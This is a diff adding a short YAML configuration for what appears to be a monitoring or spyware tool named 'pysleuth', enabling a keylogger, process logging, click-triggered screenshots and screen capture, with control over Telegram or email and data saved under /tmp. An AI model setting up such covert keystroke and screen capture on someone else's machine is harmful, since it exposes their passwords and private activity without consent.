@@ -1,0 +1,21 @@
+General:
+  control-mode: telegram # or email
+  monitor-every: 3
+  save-data-to: /tmp/pysleuth
+
+Components:
+  KeyLogger:
+    enable: true
+
+  Process-Monitor:
+    enable: true
+    log-every: 3
+
+  Mouse-Monitor:
+    enable: true
+    # take screenshots on mouse clicks/release
+    capture-on-activity: true
+
+  Screen-Monitor:
+    enable: true
+    log-every: 5
